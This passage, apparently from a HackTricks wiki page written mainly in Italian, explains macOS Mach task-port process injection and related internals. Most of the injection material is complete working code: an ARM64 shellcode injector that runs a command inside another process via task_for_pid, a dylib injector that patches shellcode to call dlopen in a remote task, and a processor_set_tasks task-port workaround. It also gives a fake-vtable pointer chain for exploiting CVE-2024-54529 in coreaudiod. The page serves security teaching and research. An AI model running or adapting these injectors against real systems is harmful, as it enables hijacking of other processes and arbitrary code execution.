// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compila** il programma precedente e aggiungi gli **entitlements** per poter effettuare l'iniezione di codice con lo stesso utente (altrimenti dovrai usare **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> For far funzionare questa tecnica su iOS è necessario l'entitlement `dynamic-codesigning` per poter rendere eseguibile una memoria scrivibile.

### Dylib Injection in thread tramite Task port

In macOS i **threads** possono essere manipolati tramite **Mach** o usando la **posix `pthread` api**. Il thread che abbiamo generato nella injection precedente è stato generato usando la Mach api, quindi **non è compatibile con posix**.

Era possibile **injectare un semplice shellcode** per eseguire un comando perché **non doveva funzionare con api** compatibili con **posix**, ma solo con Mach. **Injection più complesse** richiederebbero che il **thread** fosse anche **compatibile con posix**.

Pertanto, per **migliorare il thread**, dovrebbe chiamare **`pthread_create_from_mach_thread`**, che **creerà un pthread valido**. Questo nuovo pthread potrebbe quindi **chiamare dlopen** per **caricare una dylib** dal sistema; invece di scrivere nuovo shellcode per eseguire azioni diverse, sarebbe quindi possibile caricare librerie personalizzate.<sup>[[2]](#references)</sup>

Puoi trovare **dylib di esempio** in (ad esempio quella che genera un log che puoi poi ascoltare):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking tramite Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In questa tecnica viene eseguito l'hijacking di un thread del processo:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Rilevamento di Task Port Injection

Quando si chiama `task_for_pid` o `thread_create_*`, viene incrementato un contatore nella struct task del kernel, a cui è possibile accedere dalla user mode chiamando `task_info(task, TASK_EXTMOD_INFO, ...)`

## Exception Ports

Quando si verifica un'eccezione in un thread, questa eccezione viene inviata alla exception port designata del thread. Se il thread non la gestisce, viene inviata alle exception port del task. Se il task non la gestisce, viene inviata alla host port, gestita da launchd, dove verrà riconosciuta. Questo processo è chiamato exception triage.

Si noti che alla fine, generalmente, se il report non viene gestito correttamente, verrà gestito dal daemon ReportCrash. Tuttavia, è possibile che un altro thread dello stesso task gestisca l'eccezione; è ciò che fanno strumenti di crash reporting come `PLCreashReporter`.

## Altri oggetti

### Clock

Qualsiasi utente può accedere alle informazioni relative al clock; tuttavia, per impostare l'ora o modificare altre impostazioni è necessario essere root.

Per ottenere informazioni è possibile chiamare funzioni dal sottosistema `clock`, come: `clock_get_time`, `clock_get_attributtes` o `clock_alarm`\
Per modificare i valori, è possibile utilizzare il sottosistema `clock_priv` con funzioni come `clock_set_time` e `clock_set_attributes`

### Processors e Processor Set

Le API dei processor consentono di controllare un singolo processor logico tramite funzioni come `processor_start`, `processor_exit`, `processor_info` e `processor_get_assignment`.

Inoltre, le API del **processor set** forniscono un modo per raggruppare più processor in un gruppo. È possibile recuperare il processor set predefinito chiamando **`processor_set_default`**.\
Queste sono alcune API interessanti per interagire con il processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Restituisce un array di send rights per tutti i task all'interno del processor set
- `processor_set_threads`: Restituisce un array di send rights per tutti i thread all'interno del processor set
- `processor_set_stack_usage`
- `processor_set_info`

Come indicato in [**questo post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in passato questo consentiva di bypassare la protezione menzionata in precedenza per ottenere le task port di altri processi e controllarli chiamando **`processor_set_tasks`**, ottenendo una host port per ogni processo.<sup>[[10]](#references)</sup>\
Oggi è necessario essere root per utilizzare quella funzione, che è protetta; pertanto sarà possibile ottenere queste port solo sui processi non protetti.<sup>[[10]](#references)</sup>

È possibile provarla con:

<details>

<summary><strong>codice di processor_set_tasks</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; chiamata indiretta attraverso lo slot della vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
